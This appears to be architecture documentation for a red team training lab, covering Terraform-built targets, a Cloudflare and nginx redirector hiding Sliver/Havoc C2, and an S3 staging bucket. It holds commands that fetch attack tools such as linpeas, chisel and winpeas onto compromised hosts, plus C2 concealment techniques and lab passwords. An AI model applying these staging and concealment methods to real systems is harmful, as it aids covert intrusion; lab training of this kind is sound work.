# Nyxera Red Team Lab Architecture

<!-- This documentation lives under docs/. -->

## Overview

This repository deploys a **hybrid red team infrastructure** designed to simulate realistic adversary operations while maintaining strong operational security and minimal cloud costs.

Unlike traditional infrastructures where the Command & Control (C2) servers run in cloud environments, this lab keeps the **C2 infrastructure local on the operator laptop**, while cloud infrastructure is used exclusively for:

* traffic redirection
* staging infrastructure
* attack surface simulation
* pivoting and lateral movement exercises

The architecture implements **multiple layers of indirection** similar to those used by real-world adversaries.

---

# Terraform Layout (CORE / LAB01 / LAB02)

This repo is split into independent Terraform stacks (separate state per folder):

* `RED-TEAM-Labs/CORE` (persistent) → shared VPC/subnet, redirector + Elastic IP association, payload bucket
* `RED-TEAM-Labs/LAB01` (ephemeral) → Linux targets (initial foothold + lateral target)
* `RED-TEAM-Labs/LAB02` (ephemeral) → Windows target company environment (DC/DNS + Windows Server 2022 Core workstations)

**Important:** Only run `terraform destroy` in `LAB01` and/or `LAB02` when you want to tear down labs.
`CORE` is designed to be persistent (S3 bucket + EIP are protected with `prevent_destroy`).

---

# High Level Architecture

The lab uses a layered infrastructure designed to hide the real command and control servers while enabling internal attack simulation.

Traffic flow:

```
Victim
  │
  ▼
lab.nyxera.cloud
  │
  ▼
Cloudflare Edge Network
(DNS + CDN + WAF)
  │
  ▼
Cloudflare Tunnel
  │
  ▼
AWS Redirector (nginx)
  │
  ▼
WireGuard Tunnel
  │
  ▼
Operator Laptop
  │
  ▼
Sliver / Havoc C2
  │
  ▼
Compromised Host (linux01)
  │
  ▼
Internal Pivot
  │
  ▼
Internal Host (linux02)
```

This layered architecture ensures that the **real C2 server is never directly exposed to the internet** while still allowing realistic post-exploitation scenarios.

---

# Infrastructure Components

# 1. Operator Laptop

The operator laptop hosts the **command and control servers** used during operations.

Installed components:

* Havoc C2
* Sliver C2
* WireGuard client
* offensive tooling
* AWS CLI
* Terraform

The laptop acts as the **final destination for all command and control communications**.

No services running on the laptop are exposed publicly.

---

## Sliver Ports (Important)

Sliver uses a dedicated TLS port for the operator console ("multiplayer") that is **not the same as the HTTP(S) listener used by beacons**.

Typical split:

```
sliver-client → multiplayer server → 10.13.13.1:31337
beacon listener → HTTP/S → 10.13.13.1:8443
```

Example issue:

```
sliver-client
Connecting to 10.13.13.1:8443 ...
Connection to server failed context deadline exceeded
```

This means the client is attempting to connect to the **beacon listener instead of the multiplayer port**.

Correct port:

```
31337
```

---

## Network Configuration

Operator public IP:

```
190.18.171.24/32
```

This value is used to restrict SSH management access via the `ssh_cidr_blocks` variable (set in `CORE`/`LAB01`/`LAB02` `terraform.tfvars` as needed).

WireGuard network:

```
10.13.13.0/24
```

Operator tunnel address:

```
10.13.13.1
```

Redirector address:

```
10.13.13.2
```

All C2 communications from the redirector are forwarded through this tunnel.

---

# 2. Cloudflare Layer

Cloudflare provides an additional masking and protection layer.

Services used:

* DNS resolution
* CDN masking
* TLS termination
* WAF protection
* Cloudflare Tunnel

Domain used by the lab:

```
lab.nyxera.cloud
```

Traffic flow:

```
Victim → Cloudflare → Cloudflare Tunnel → AWS Redirector
```

This prevents the AWS redirector from exposing the real C2 infrastructure.

---

# DNS Configuration

Cloudflare manages DNS for the lab domain.

Example configuration:

```
Type: A
Name: lab
Value: <redirector_elastic_ip>
Proxy: enabled
```

Example result:

```
lab.nyxera.cloud → Cloudflare → AWS redirector
```

Using the Cloudflare proxy hides the real origin IP.

---

# Cloudflare Tunnel

Cloudflare Tunnel securely connects the Cloudflare network to the AWS redirector.

Example configuration:

```
tunnel: nyxera-redteam
credentials-file: /root/.cloudflared/<tunnel-id>.json

ingress:
  - hostname: lab.nyxera.cloud
    service: http://localhost:80
  - service: http_status:404
```

The `cloudflared` daemon runs as a system service on the redirector.

The tunnel forwards traffic to nginx.

---

# 3. AWS Redirector

The redirector server is deployed using Terraform.

Instance type:

```
t3.micro
```

Responsibilities:

* receive HTTP traffic from Cloudflare
* act as nginx redirector
* forward C2 traffic through WireGuard
* provide benign responses to scanners

Installed software:

* nginx
* wireguard
* cloudflared
* fail2ban

---

# Nginx Redirector Design

The nginx redirector hides the command and control infrastructure behind a specific URI.

Example hidden endpoint:

```
/cdn/api/v3
```

Additional hidden endpoint (secondary channel):

```
/cdn/api/v4
```

Normal requests return a benign response:

```
Nyxera Cloud
```

Proxy flow:

```
/cdn/api/v3
        │
        ▼
10.13.13.1:8443
```

Secondary proxy flow:

```
/cdn/api/v4
        │
        ▼
10.13.13.1:8444
```

Traffic is forwarded through the WireGuard tunnel to the operator laptop.

---

# Security Controls

Security measures implemented:

SSH restricted to operator IP:

```
190.18.171.24/32
```

Additional protections:

* nginx filtering
* fail2ban
* hidden C2 endpoint
* CDN masking
* encrypted WireGuard tunnel

These protections ensure the real C2 infrastructure remains hidden.

---

# 4. WireGuard Tunnel

WireGuard provides encrypted communication between the redirector and the operator laptop.

Tunnel network:

```
10.13.13.0/24
```

Addresses:

```
Operator laptop → 10.13.13.1
AWS redirector → 10.13.13.2
```

All command and control traffic passes through this encrypted channel.

---

# 5. Internal Lab Targets

The lab includes multiple EC2 instances used to simulate internal network environments.

Instances:

```
LAB01 (Linux):
  nyxera-rt-target-ubuntu-01          (initial foothold / vulnerable apps)
  nyxera-rt-lateral-target-ubuntu-02  (lateral movement target)

LAB02 (Windows target company "LumenWorks"):
  nyxera-rt-lumenworks-dc-win2022-01  (AD DS + DNS)
  nyxera-rt-lumenworks-it-win2022-01  (IT workstation)
  nyxera-rt-lumenworks-fin-win2022-02 (Finance workstation)
```

Instance type:

```
t3.micro
```

Network layout:

```
Shared VPC/Subnet (CORE)
  ├── LAB01 Linux targets
  └── LAB02 Windows domain/workstations
```

The Linux target simulates the **initial compromise point**.
The lateral Linux target and Windows hosts simulate **internal post-exploitation objectives**.

---

# 5.2 LAB01 (Linux) Lateral Movement Simulation

LAB01 includes intentionally insecure (lab-only) configurations to support realistic lateral movement exercises between:

* `nyxera-rt-target-ubuntu-01` (initial foothold)
* `nyxera-rt-lateral-target-ubuntu-02` (internal lateral target)

Configured components (Terraform-managed):

1) **Credential reuse via SSH**
   * A shared local user `devops` exists on both hosts.
   * The same lab-only password is configured for `devops` on both hosts (variable: `devops_password`).
   * SSH password authentication is enabled on both hosts.
   * The LAB01 security group allows TCP/22 within the VPC CIDR for host-to-host movement.

2) **Internal file share (NFSv4)**
   * `linux02` exports an NFSv4 share at `/srv/ops-share` to the VPC CIDR.
   * `linux01` mounts the share at `/mnt/ops-share` (best-effort with retries during first boot).

3) **Basic audit telemetry**
   * `auditd` is enabled on both hosts.
   * A minimal ruleset watches identity/sudoer changes:
     * `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`

Operational notes:

* These settings are intentionally weak and are meant only for isolated lab environments.
* The `linux02` private IP is kept stable via `linux02_private_ip` (used by the NFS mount).

Example attack path:

```
Attacker
   │
   ▼
Compromise linux01
   │
   ▼
Privilege escalation
   │
   ▼
Pivot using tunneling tools
(chisel / ligolo / socat)
   │
   ▼
Access linux02
```

This allows testing:

* lateral movement
* pivoting
* internal reconnaissance
* privilege escalation
* credential harvesting

---

# 5.1 LAB02 (Windows) Domain Bootstrap

LAB02 aims to look like a small corporate target ("LumenWorks") with AD + workstations.

Domain:

```
lumenworks.internal
```

DC/DNS private IP (static):

```
10.0.1.10
```

Automation behavior:

* The DC installs AD DS + DNS and promotes the forest when `ad_safe_mode_password` is set.
* Workstations retry domain join for up to ~30 minutes (to avoid race conditions while AD comes up).
* The domain user `it.support` is created on the DC.
* The Finance workstation adds `LUMENWORKS\\it.support` as a **local Administrator** (so the user of machine A has admin rights on machine B).

---

# 6. Payload Delivery Infrastructure

Artifact staging is handled through an S3 bucket.

Bucket name:

```
redteam-lab-payloads
```

Unlike the rest of the infrastructure, the payload bucket is **persistent** and is not destroyed when the lab environment is torn down.

Purpose:

* payload hosting
* tool staging
* script distribution
* binary delivery

Access model:

* The bucket is **private-by-default**.
* Short-lived **presigned URLs** are used for controlled downloads.

Example payload URL (presigned):

```
<PRESIGNED_URL_TO_b/beacon>
```

---

# Staging Server Layout

The bucket is organized using short operational paths.

```
redteam-lab-payloads/
```

Structure:

```
b/ → beacons
l/ → linux tools
w/ → windows tools
p/ → pivot tools
c/ → credential access
s/ → scripts
```

Example contents:

```
l/
  linpeas.sh
  linenum.sh
  linux-exploit-suggester.sh
  pspy64

w/
  winpeas.exe
  seatbelt.exe
  sharpup.exe

p/
  chisel
  ligolo-agent
  socat

c/
  mimikatz.exe

b/
  beacon
```

Example usage from a lab host (placeholders):

```
curl -fsSL "<PRESIGNED_URL_TO_l/linpeas.sh>" -o linpeas.sh
```

or

```
wget "<PRESIGNED_URL_TO_p/chisel>"
```

Windows example:

```
powershell iwr "<PRESIGNED_URL_TO_w/winpeas.exe>" -OutFile winpeas.exe
```

See:

* `docs/user-guide/07-s3-staging.md` (presign workflow)
* `docs/beacon_commands.txt` (download placeholders tied to S3 inventory)

---

# Credentials (LAB02)

These credentials are **lab-only**. They are defined in `RED-TEAM-Labs/LAB02/terraform.tfvars` and are also rendered into EC2 `user_data` for first-boot automation.

Domain:

```
LUMENWORKS (lumenworks.internal)
```

Domain admin:

```
Administrator
Password: ChangeMe-StrongPassword-01
```

Primary user (Workstation A):

```
it.support
Password: ChangeMe-StrongPassword-02
```

Privilege relationship (as deployed by LAB02 automation):

```
it.support  -> local Administrator on nyxera-rt-lumenworks-fin-win2022-02
```

---

# Terraform Responsibilities

Terraform provisions the cloud infrastructure:

* CORE: VPC/subnet/routes, redirector, Elastic IP association, payload bucket
* LAB01: Linux target instances + security group
* LAB02: Windows instances + security group + bootstrap scripts via `user_data`

Terraform **does not manage**:

* local C2 infrastructure
* operator tools
* payload development

The payload bucket is treated as **persistent infrastructure** and may exist outside Terraform control to avoid accidental destruction.

---

# Deployment Workflow

Initialize and deploy CORE (persistent):

```
cd RED-TEAM-Labs/CORE
terraform init
terraform apply
```

Deploy LAB01 (Linux):

```
cd ../LAB01
terraform init
terraform apply
```

Deploy LAB02 (Windows):

```
cd ../LAB02
terraform init
terraform apply
```

Destroy LAB01 and/or LAB02 (do not destroy CORE):

```
cd RED-TEAM-Labs/LAB01 && terraform destroy
cd RED-TEAM-Labs/LAB02 && terraform destroy
```

Retrieve CORE redirector IP:

```
cd RED-TEAM-Labs/CORE
terraform output redirector_public_ip
```

Configure Cloudflare DNS:

```
lab.nyxera.cloud → redirector IP
```

Start cloudflared:

```
systemctl start cloudflared
```

---

# Repository Structure

Example repository layout:

```
RED-TEAM-Labs/
  CORE/
    *.tf
    terraform.tfvars.example

  LAB01/
    *.tf
    userdata/

  LAB02/
    *.tf
    userdata/
    terraform.tfvars
    terraform.tfvars.example
```

---

# OPSEC Improvements

The architecture incorporates multiple operational security measures inspired by real adversary infrastructure.

Examples:

* layered redirector infrastructure
* CDN masking
* encrypted operator tunnels
* hidden C2 endpoints
* benign responses to scanners
* staging infrastructure isolation

Future improvements may include:

* multi-hop redirectors
* JA3 traffic camouflage
* rotating domains
* automated staging rotation
* traffic shaping

---

# Purpose of the Lab

This lab environment is designed for:

* red team training
* adversary emulation
* infrastructure experimentation
* offensive security research

The architecture enables **realistic attack simulation** while maintaining **clear separation between operator infrastructure and cloud resources**.
